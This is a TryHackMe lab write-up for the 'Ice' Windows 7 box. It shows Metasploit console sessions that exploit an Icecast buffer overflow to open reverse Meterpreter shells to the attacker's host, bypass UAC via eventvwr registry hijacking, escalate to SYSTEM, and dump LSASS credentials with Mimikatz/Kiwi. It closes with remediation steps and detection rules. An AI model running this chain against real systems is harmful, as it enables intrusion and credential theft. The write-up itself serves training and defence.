# Ice - Buffer Overflows, UAC Bypasses, and LSASS Memory Extraction

**Platform:** TryHackMe | **Target OS:** Windows (Windows 7 Professional SP1) | **Difficulty:** Easy  
**Focus:** Icecast Header Overwrite (CVE-2004-1561), EventVwr UAC Bypass, Process Architecture Migration, LSASS Credential Dumping (`Mimikatz/Kiwi`)

---

## 1. Executive Summary & Attack Chain

During this security assessment, a complete host compromise was achieved against the target **Ice** (`10.129.171.238`), running a legacy Windows 7 Professional SP1 operating system. The assessment simulated an external threat actor progressing from external discovery to total domain-level credential extraction.

The attack kill-chain unfolded through the following phases:
1. **Perimeter Reconnaissance:** Network scanning identified legacy Windows services (SMB/RDP) and a third-party media streaming application, **Icecast 2.0.1**, listening on port `8000`.
2. **Initial Access (Buffer Overflow):** The Icecast application was vulnerable to CVE-2004-1561, a known stack-based buffer overflow triggered via excessive HTTP headers. Exploiting this memory corruption flaw yielded an initial low-privilege `Meterpreter` session operating under the `Dark-PC\Dark` user context.
3. **Local Enumeration & UAC Evasion:** Utilizing local exploit suggesters, the system was identified as vulnerable to an Event Viewer (`eventvwr.exe`) User Account Control (UAC) bypass. By hijacking registry handlers, a high-integrity session was spawned without triggering a visual UAC prompt.
4. **Privilege Escalation & Impersonation:** Elevated process rights allowed the invocation of Named Pipe Impersonation (`getsystem`), successfully escalating privileges to `NT AUTHORITY\SYSTEM`.
5. **Post-Exploitation & Credential Harvesting:** To interact with 64-bit kernel memory, the execution context was migrated from a 32-bit process into the 64-bit Print Spooler service (`spoolsv.exe`). Subsequently, the `Kiwi` (Mimikatz) extension was injected into LSASS memory, successfully extracting cleartext passwords (`Password01!`) cached by the WDigest and Kerberos SSPs.

### Attack Kill-Chain Diagram
```text
[ Port 8000 Discovery ] ──────> Identified Vulnerable Icecast Server v2.0.1
              │
              ▼
[ Stack Buffer Overflow ] ────> Exploited CVE-2004-1561 (Header Overwrite) -> Low-Priv Shell
              │
              ▼
[ UAC Registry Hijack ] ──────> Exploited 'eventvwr.exe' Auto-Elevation -> High-Integrity Shell
              │
              ▼
[ Token Impersonation ] ──────> 'getsystem' via Named Pipes -> NT AUTHORITY\SYSTEM
              │
              ▼
[ Process Migration ] ────────> Migrated x86 Payload to x64 Native Process ('spoolsv.exe')
              │
              ▼
[ LSASS Memory Extraction ] ──> Injected Mimikatz/Kiwi -> Recovered Cleartext Credentials
```

---

## 2. Network Reconnaissance & Surface Mapping

An initial service and versioning scan was conducted utilizing Nmap:

```bash
❯ sudo nmap -sC -sV -sS 10.129.171.238
[sudo] password for 0xZiki:
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-14 03:05 +0300
Nmap scan report for 10.129.171.238
Host is up (0.14s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2026-09-14T00:06:52+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2026-09-14T00:06:38+00:00
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2026-09-13T00:02:30
|_Not valid after:  2027-03-15T00:02:30
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Analysis of Perimeter Surface
- **SMB (445):** Confirmed the target OS as `Windows 7 Professional SP1` belonging to `WORKGROUP`.
- **RDP (3389):** Remote Desktop is exposed, identifying the machine name as `Dark-PC`.
- **HTTP (8000):** Hosting an instance of **Icecast streaming media server**. 

Querying Exploit-DB confirmed that Icecast `2.0.1` is susceptible to multiple severe vulnerabilities, most notably a Remote Code Execution (RCE) flaw.

---

## 3. Initial Access: Icecast Header Overwrite (CVE-2004-1561)

### Theoretical Mechanics: Stack-Based Buffer Overflow
The Icecast 2.0.1 Win32 implementation contains a memory corruption vulnerability within its HTTP request parsing engine. The software allocates a fixed-size array on the stack to store HTTP headers (expecting a maximum of 31 headers). 

When an attacker transmits a maliciously crafted HTTP request containing **32 headers**, the boundary checks fail. The 32nd header writes beyond the allocated buffer constraints, overwriting the saved Return Address (Instruction Pointer / `EIP`) on the stack. By padding the buffer and replacing the `EIP` with a pointer to a `JMP ESP` instruction (found at a static memory address in an imported DLL like `avcodec.dll`), execution flow is redirected straight into the attacker's embedded Shellcode (Meterpreter).

### Exploitation via Metasploit
After some initial environmental troubleshooting (connection timeouts due to incorrect IP targeting), the correct target was engaged:

```text
msf > search Icecast
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite

msf exploit(windows/http/icecast_header) > set lhost 192.168.192.12
lhost => 192.168.192.12
msf exploit(windows/http/icecast_header) > set rhosts 10.130.181.216
rhosts => 10.130.181.216
msf exploit(windows/http/icecast_header) > set lport 4001
lport => 4001
msf exploit(windows/http/icecast_header) > exploit
[*] Started reverse TCP handler on 192.168.192.12:4001
[*] Sending stage (203454 bytes) to 10.130.181.216
[*] Meterpreter session 1 opened (192.168.192.12:4001 -> 10.130.181.216:49182) at 2026-09-14 04:24:25 +0300

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

The shell successfully initialized under the standard user `Dark-PC\Dark`. The initial payload spawned as a 32-bit (`x86`) process due to the Icecast binary's architecture.

---

## 4. Local Enumeration & UAC Evasion

Standard operational procedures demand privilege escalation. The MSF `local_exploit_suggester` was deployed:

```text
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.130.181.216 - Collecting local exploits for x86/windows...
[+] 10.130.181.216 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. Version Windows 7 Service Pack 1 appears vulnerable
```

### OS Mechanics: EventVwr UAC Bypass
In Windows 7, User Account Control (UAC) separates standard user privileges from administrative tasks. However, Microsoft grants auto-elevation privileges to specific digitally-signed internal binaries, such as `eventvwr.exe` (Event Viewer), allowing them to execute with High Integrity without prompting the user.

When `eventvwr.exe` is launched, it queries the Windows Registry (`HKCU\Software\Classes\mscfile\shell\open\command`) to locate the `mmc.exe` (Microsoft Management Console) path to open the Event Viewer snap-in. 
Crucially, `HKCU` (HKEY_CURRENT_USER) is fully writable by a standard, unprivileged user. By injecting the Meterpreter payload path into this registry key, starting `eventvwr.exe` forces the auto-elevated process to spawn the malicious executable instead of `mmc.exe`—bypassing the UAC prompt silently.

### Executing the Bypass
```text
msf exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
SESSION => 1
msf exploit(windows/local/bypassuac_eventvwr) > set lhost 192.168.192.12
msf exploit(windows/local/bypassuac_eventvwr) > set LPORT 1234
msf exploit(windows/local/bypassuac_eventvwr) > run
[*] Started reverse TCP handler on 192.168.192.12:1234
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (203454 bytes) to 10.130.181.216
[*] Meterpreter session 2 opened (192.168.192.12:1234 -> 10.130.181.216:49208) at 2026-09-14 04:29:28 +0300
[*] Cleaning up registry keys ...
```

---

## 5. Privilege Escalation & LSASS Credential Harvesting

With a High-Integrity session secured, maximum system privileges were achieved using Token Impersonation:

```text
meterpreter > detuid
[-] Unknown command: detuid. Did you mean getuid? Run the help command for more details.
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
*(Under the hood, `getsystem` creates a named pipe, forces the SYSTEM account to connect to it via an RPC call, and utilizes `ImpersonateNamedPipeClient()` to steal the resulting SYSTEM token).*

### Architecture Migration & Memory Operations
Although executing as `SYSTEM`, the current Meterpreter instance was running within a 32-bit (`x86`) context. Tools like Mimikatz require deep kernel and memory interaction (reading the `LSASS.exe` space). A 32-bit process cannot reliably map the memory space of a 64-bit LSASS process.

To resolve this, the payload was migrated to a stable 64-bit native system process, `spoolsv.exe` (Print Spooler - PID 1372):

```text
meterpreter > ps
 1372  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2064  908   powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe

meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2064 to 1372...
[*] Migration completed successfully.
```

### LSASS Credential Dumping via Kiwi (Mimikatz)
With the architecture aligned, the `kiwi` extension was loaded to interrogate the Local Security Authority Subsystem Service (LSASS):

```text
meterpreter > load kiwi
Loading extension kiwi...
Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

**Cryptographic Disclosure:** Windows 7 natively caches plaintext passwords in memory via the `WDigest` and `TsPkg` Security Support Providers (SSPs) to support Single Sign-On functionalities. Mimikatz successfully scraped the memory blocks, recovering the cleartext password for user `Dark`: **`Password01!`**.

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

| Vulnerability / Misconfiguration | Severity | Mitigation Action |
| :--- | :--- | :--- |
| **Icecast Header Buffer Overflow** | **Critical** | Upgrade the Icecast application to a modern, supported release (v2.4.x+). Applications with documented remote memory corruption flaws must not be exposed to perimeter networks. |
| **WDigest Cleartext Caching** | **High** | Disable WDigest credential caching in the Windows Registry. Navigate to `HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest` and set the `UseLogonCredential` DWORD to `0`. |
| **End of Life OS (Windows 7)** | **Critical** | Windows 7 reached End of Life (EOL). Decommission the host or upgrade to a supported operating system (Windows 10/11) to mitigate missing structural patches for UAC bypasses and memory security mechanisms (ASLR/DEP). |

---

### Detection Engineering

#### 1. Splunk / Sysmon (Detecting EventVwr UAC Bypass)
Monitor for registry modifications targeting the `mscfile` shell command handler originating from non-administrative processes:

```spl
index=sysmon EventCode=13 OR EventCode=12 
TargetObject="*\\Software\\Classes\\mscfile\\shell\\open\\command\\*" 
| stats count min(_time) as firstTime max(_time) as lastTime by Computer, User, Image, TargetObject, Details
```

#### 2. Sigma Rule (Suspicious Named Pipe Impersonation / Meterpreter Migration)
```yaml
title: Suspicious Remote Thread Creation into Spoolsv (Process Migration)
id: 61c5dfd4-a10d-4008-8f89-8d76c3f3b921
status: experimental
description: Detects process injection or migration into the Print Spooler service, indicative of post-exploitation persistence or architecture adjustment for LSASS dumping.
logsource:
  category: create_remote_thread
  product: windows
detection:
  selection:
    TargetImage|endswith: '\spoolsv.exe'
    SourceImage|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
      - '\rundll32.exe'
  condition: selection
falsepositives:
  - Very rare legitimate administrative tools interacting with print queues.
level: high
tags:
  - attack.privilege_escalation
  - attack.defense_evasion
  - attack.t1055
```
